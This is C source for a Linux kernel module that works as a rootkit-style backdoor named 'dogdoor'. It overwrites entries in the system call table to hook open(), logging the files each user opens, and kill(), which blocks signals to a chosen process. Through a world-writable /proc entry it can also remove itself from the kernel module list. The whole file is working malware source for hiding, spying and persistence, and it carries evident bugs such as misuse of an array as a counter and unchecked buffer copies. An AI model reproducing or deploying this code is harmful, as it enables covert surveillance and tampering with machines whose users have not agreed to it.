#include <linux/syscalls.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/cred.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");

char m_name[128] = { 0x0, } ;
int m_num=0;
void ** sctable ;
bool hiding = false;
struct module *current_mod;
struct list_head *temp_module_list;
int count[1001] = { 0 };
int specified_Id = 0;
char logfile[1001][10][128];

asmlinkage int (*orig_sys_kill)(pid_t pid, int signal) ;
asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 
asmlinkage int m_sys_open(const char __user * filename, int flags, umode_t mode)
{
	char buf[256];
	char fname[256] ;
	int input_user = current_uid().val;
	int i = 0;
	copy_from_user(fname, filename, 256) ;
	

	/* TODO: */
// 	if (specified_Id == input_user) {
		if(strcmp(".", fname) != 0){
			if(fname[0] != '/'){
				if(count[input_user] != 10){
					strncpy(logfile[input_user][count[input_user]], fname, 127);
					count[input_user] ++;
				}else{
					for(i = 0; i < 9; i++){
						strncpy(logfile[input_user][i], logfile[input_user][i + 1], 127);
					}
					strncpy(logfile[input_user][9], fname, 127);
				}			
			}
		}
// 	}

	return orig_sys_open(filename, flags, mode) ;
}
asmlinkage int m_sys_kill(pid_t pid, int signal) {
	if(m_num == ((int) pid))
		return -1;
	return orig_sys_kill(pid,signal);
}
static 
int m_open(struct inode *inode, struct file *file) {
	return 0 ;
}

static 
int m_release(struct inode *inode, struct file *file) {
	return 0 ;
}

static
ssize_t m_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) 
{
	/* TODO: */
	char buf[256] = {'\0'};
	char temp[256] = {'\0'};
	
	ssize_t toread ;
	int k = 0;
	
	if(count == 0){
		sprintf(buf, "there is no log\n");
	}else{	
		char u_id_str[20];
		sprintf(u_id_str, "%d\n", specified_Id);
		
		strcat(buf, "user: ");
		strcat(buf, u_id_str);
		for(k = 0; k < count; k++){
			sprintf(temp,"%d) %s\n",  k + 1, logfile[specified_Id][k]);
			strcat(buf, temp);
		}
	}

	toread = strlen(buf) >= *offset + size ? size : strlen(buf) - *offset ;

	if (copy_to_user(ubuf, buf + *offset, toread))
		return -EFAULT ;	

	*offset = *offset + toread ;
	

	return toread ;
}

static 
ssize_t m_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) 
{
	char buf[128] ;

	if (*offset != 0 || size > 128)
		return -EFAULT ;

	if (copy_from_user(buf, ubuf, size))
		return -EFAULT ;

	char m_temp[128] = { 0x0, } ;
	sscanf(buf,"%128s", m_temp) ;

	
	if(m_temp[0]=='o') { //on , off
        	hiding = !hiding;
        
		if(hiding) {
		    list_del_init(&current_mod->list);
		} else {
		    list_add(&current_mod->list,temp_module_list);
		}
	} else if(m_temp[0]=='u') { /*change type string as integer*/
		int res = 0;
		int i;
		for(i = 1; m_temp[i] != '\0'; ++i) {
		    res = res*10 +m_temp[i] - '0';
		}
		specified_Id = res;
	} else { 
		int res=0;
		int i;
		for(i = 0; m_temp[i] != '\0'; ++i) {
		    res = res*10 +m_temp[i] - '0';
		}
		m_num = res;
	}       /*  */

	*offset = strlen(buf) ;

	return *offset ;
}

static const struct file_operations m_fops = {
	.owner = 	THIS_MODULE,
	.open = 	m_open,
	.read = 	m_read,
	.write = 	m_write,
	.llseek = 	seq_lseek,
	.release = 	m_release,
} ;

static 
int __init m_init(void) {
	unsigned int level;
	pte_t* pte;
	proc_create("dogdoor", S_IRUGO | S_IWUGO, NULL, &m_fops) ;

	sctable = (void *) kallsyms_lookup_name("sys_call_table") ;

	orig_sys_kill = sctable[__NR_kill];
	orig_sys_open = sctable[__NR_open];
	pte = lookup_address((unsigned long) sctable, &level);
	if(pte->pte &~ _PAGE_RW)
		pte->pte |= _PAGE_RW;
	sctable[__NR_kill] = m_sys_kill;
	sctable[__NR_open] = m_sys_open;

    current_mod = &__this_module;
	temp_module_list = current_mod->list.prev;

	return 0;
}

static 
void __exit m_exit(void) {
	unsigned int level;
	pte_t* pte;
	remove_proc_entry("dogdoor", NULL) ;

	sctable[__NR_open] = orig_sys_open;
	sctable[__NR_kill] = orig_sys_kill;
	pte = lookup_address((unsigned long) sctable, &level);
	pte->pte = pte->pte &~ _PAGE_RW;
}


module_init(m_init);
module_exit(m_exit);
